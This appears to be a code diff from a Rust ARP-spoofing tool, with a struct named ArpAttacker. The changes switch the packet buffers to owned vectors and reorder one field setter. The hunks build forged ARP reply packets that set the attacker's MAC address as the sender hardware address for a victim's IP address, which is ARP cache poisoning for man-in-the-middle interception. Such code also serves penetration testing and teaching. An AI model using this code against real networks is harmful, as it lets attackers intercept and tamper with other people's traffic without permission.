@@ -58,21 +58,21 @@ impl ArpAttacker {
         source: (Ipv4Addr, MacAddr),
         target: (Ipv4Addr, MacAddr),
     ) -> Result<()> {
-        let mut eth_buffer = [0u8; 42];
-        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer)
+        let eth_buffer = [0u8; 42];
+        let mut eth_packet = MutableEthernetPacket::owned(eth_buffer.to_vec())
             .ok_or(anyhow!("MutableEthernetPacket returned None"))?;
         eth_packet.set_source(self.mac);
         eth_packet.set_destination(target.1);
         eth_packet.set_ethertype(EtherTypes::Arp);
-        let mut arp_buffer = [0u8; 28];
-        let mut mut_arp_packet = MutableArpPacket::new(&mut arp_buffer)
+        let arp_buffer = [0u8; 28];
+        let mut mut_arp_packet = MutableArpPacket::owned(arp_buffer.to_vec())
             .ok_or(anyhow!("MutableArpPacket returned None"))?;
         mut_arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
         mut_arp_packet.set_protocol_type(EtherTypes::Ipv4);
         mut_arp_packet.set_hw_addr_len(6);
-        mut_arp_packet.set_proto_addr_len(4);
         mut_arp_packet.set_sender_hw_addr(self.mac);
         mut_arp_packet.set_target_hw_addr(source.1);
+        mut_arp_packet.set_proto_addr_len(4);
         mut_arp_packet.set_sender_proto_addr(target.0);
         mut_arp_packet.set_target_proto_addr(source.0);
         mut_arp_packet.set_operation(ArpOperations::Reply);
@@ -92,14 +92,14 @@ impl ArpAttacker {
         source: (Ipv4Addr, MacAddr),
         target: (Ipv4Addr, MacAddr),
     ) -> Result<()> {
-        let mut eth_buffer = [0u8; 42];
-        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer)
+        let eth_buffer = [0u8; 42];
+        let mut eth_packet = MutableEthernetPacket::owned(eth_buffer.to_vec())
             .ok_or(anyhow!("MutableEthernetPacket returned None"))?;
         eth_packet.set_source(self.mac);
         eth_packet.set_destination(source.1);
         eth_packet.set_ethertype(EtherTypes::Arp);
-        let mut arp_buffer = [0u8; 28];
-        let mut mut_arp_packet = MutableArpPacket::new(&mut arp_buffer)
+        let arp_buffer = [0u8; 28];
+        let mut mut_arp_packet = MutableArpPacket::owned(arp_buffer.to_vec())
             .ok_or(anyhow!("MutableArpPacket returned None"))?;
         mut_arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
         mut_arp_packet.set_protocol_type(EtherTypes::Ipv4);
